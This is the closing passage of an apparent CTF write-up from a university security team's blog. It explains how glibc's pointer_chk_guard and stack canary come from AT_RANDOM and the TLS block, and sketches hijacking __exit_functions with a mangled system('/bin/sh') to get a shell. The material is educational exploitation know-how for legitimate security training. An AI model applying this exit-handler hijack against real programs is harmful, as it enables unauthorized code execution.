<div class="callout" data-type="info" data-astro-cid-mrmim4ef style="--bgColor: rgba(204, 204, 204, 0.05);--borderColor: var(--text-secondary);--iconColor: var(--text-secondary);"> <div class="callout-header" data-astro-cid-mrmim4ef style="--bgColor: rgba(204, 204, 204, 0.05);--borderColor: var(--text-secondary);--iconColor: var(--text-secondary);"> <span class="callout-icon" data-astro-cid-mrmim4ef style="--bgColor: rgba(204, 204, 204, 0.05);--borderColor: var(--text-secondary);--iconColor: var(--text-secondary);">üìã</span> <span class="callout-title" data-astro-cid-mrmim4ef style="--bgColor: rgba(204, 204, 204, 0.05);--borderColor: var(--text-secondary);--iconColor: var(--text-secondary);">Info</span> </div> <div class="callout-content" data-astro-cid-mrmim4ef style="--bgColor: rgba(204, 204, 204, 0.05);--borderColor: var(--text-secondary);--iconColor: var(--text-secondary);"> <p>The <strong>pointer_chk_guard</strong> is an element of the <strong>Thread Control Block</strong> (TCB) stored inside the <strong>Thread Local Storage</strong> (TLS). TLS is a fixed per-thread storage whose address is saved in a special register. Its position is randomized and very difficult to leak.</p><p><img src="/_astro/writeup-001.DYxjS-oK_ZNrOTr.webp" alt loading="lazy" decoding="async" fetchpriority="auto" width="928" height="194"></p><p>The first non address value you see is our <strong>canary</strong> (<code>stack_chk_guard</code>), you can notice the zero byte at the end, the value stored directly after is our <strong>key</strong> (<code>pointer_chk_guard</code>).</p><p>But <code>pointer_chk_guard</code> is derived from somewhere else:</p><p>When the kernel loads an executable, by calling <code>execve</code>, it writes a key-value structure called <strong>Auxiliary Vector</strong> (auxv) into memory, here many critical values are saved, you can print them by setting the <code>LD_SHOW_AUXV=1</code> environment variable.</p><pre class="astro-code dracula" style="background-color:#282A36;color:#F8F8F2;overflow-x:auto;white-space:pre-wrap;word-wrap:break-word" tabindex="0" data-language="bash"><code><span class="line"><span style="color:#50FA7B">‚ùØ</span><span style="color:#F1FA8C"> LD_SHOW_AUXV=</span><span style="color:#BD93F9">1</span><span style="color:#F1FA8C"> gdb</span></span>
<span class="line"><span style="color:#50FA7B">AT_SYSINFO_EHDR:</span><span style="color:#BD93F9">      0x7fba40212000</span></span>
<span class="line"><span style="color:#50FA7B">AT_MINSIGSTKSZ:</span><span style="color:#BD93F9">       3376</span></span>
<span class="line"><span style="color:#50FA7B">AT_HWCAP:</span><span style="color:#BD93F9">             0x178bfbff</span></span>
<span class="line"><span style="color:#50FA7B">AT_PAGESZ:</span><span style="color:#BD93F9">            4096</span></span>
<span class="line"><span style="color:#50FA7B">AT_CLKTCK:</span><span style="color:#BD93F9">            100</span></span>
<span class="line"><span style="color:#50FA7B">AT_PHDR:</span><span style="color:#BD93F9">              0x562b9823f040</span></span>
<span class="line"><span style="color:#50FA7B">AT_PHENT:</span><span style="color:#BD93F9">             56</span></span>
<span class="line"><span style="color:#50FA7B">AT_PHNUM:</span><span style="color:#BD93F9">             15</span></span>
<span class="line"><span style="color:#50FA7B">AT_BASE:</span><span style="color:#BD93F9">              0x7fba40214000</span></span>
<span class="line"><span style="color:#50FA7B">AT_FLAGS:</span><span style="color:#BD93F9">             0x0</span></span>
<span class="line"><span style="color:#50FA7B">AT_ENTRY:</span><span style="color:#BD93F9">             0x562b982f3ac0</span></span>
<span class="line"><span style="color:#50FA7B">AT_UID:</span><span style="color:#BD93F9">               1000</span></span>
<span class="line"><span style="color:#50FA7B">AT_EUID:</span><span style="color:#BD93F9">              1000</span></span>
<span class="line"><span style="color:#50FA7B">AT_GID:</span><span style="color:#BD93F9">               1000</span></span>
<span class="line"><span style="color:#50FA7B">AT_EGID:</span><span style="color:#BD93F9">              1000</span></span>
<span class="line"><span style="color:#50FA7B">AT_SECURE:</span><span style="color:#BD93F9">            0</span></span>
<span class="line"><span style="color:#50FA7B">AT_RANDOM:</span><span style="color:#BD93F9">            0x7ffee4809839</span></span>
<span class="line"><span style="color:#50FA7B">AT_HWCAP2:</span><span style="color:#BD93F9">            0x2</span></span>
<span class="line"><span style="color:#50FA7B">AT_EXECFN:</span><span style="color:#F1FA8C">            /usr/bin/gdb</span></span>
<span class="line"><span style="color:#50FA7B">AT_PLATFORM:</span><span style="color:#F1FA8C">          x86_64</span></span>
<span class="line"><span style="color:#50FA7B">AT_RSEQ_FEATURE_SIZE:</span><span style="color:#BD93F9"> 28</span></span>
<span class="line"><span style="color:#50FA7B">AT_RSEQ_ALIGN:</span><span style="color:#BD93F9">        32</span></span></code></pre><p>looking at the <code>AT_RANDOM</code> entry, we see that it points to the stack. The kernel copies 16 bytes from kernel entropy into the stack at initialization: the first 8 bytes are our canary, the second giant word is our <strong>pointer_chk_guard</strong>.
But why are the values copied into the TCB if they are saved on the stack too? Because every thread needs to access this values.</p> </div> </div> 
<h3 id="step-3-exiting-gracefully">Step 3: exiting gracefully</h3>
<p>Now we have everything to get the key, by overwriting the struct with the mangled <code>system()</code> address and <code>/bin/sh</code> as argument we simply need to run the program and exit to get a shell.</p>
<p>Still questions about <code>__exit_functions</code>? Here is a link to a nice <a href="https://binholic.blogspot.com/2017/05/notes-on-abusing-exit-handlers.html">blogpost</a>.</p> </article> </main> <footer class="footer" data-astro-cid-sz7xmlte> <div class="footer-content" data-astro-cid-sz7xmlte> <h2 data-astro-cid-sz7xmlte>Contacts</h2> <div class="contact-info" data-astro-cid-sz7xmlte> <p data-astro-cid-sz7xmlte>üìß Email: <a href="mailto:info@pwnissa.it" data-astro-cid-sz7xmlte>info@pwnissa.it</a></p> <p data-astro-cid-sz7xmlte>üêô GitHub: <a href="https://github.com/pwnissa" target="_blank" data-astro-cid-sz7xmlte>https://github.com/pwnissa</a></p> <p data-astro-cid-sz7xmlte>üìç Universit√† degli Studi di Genova, DIBRIS</p> </div> <p class="made-by" data-astro-cid-sz7xmlte>Made with ‚ô• by <a href="https://stealthguy.net" target="_blank" rel="noopener noreferrer" data-astro-cid-sz7xmlte>stealthguy</a></p> </div> </footer>  </body></html>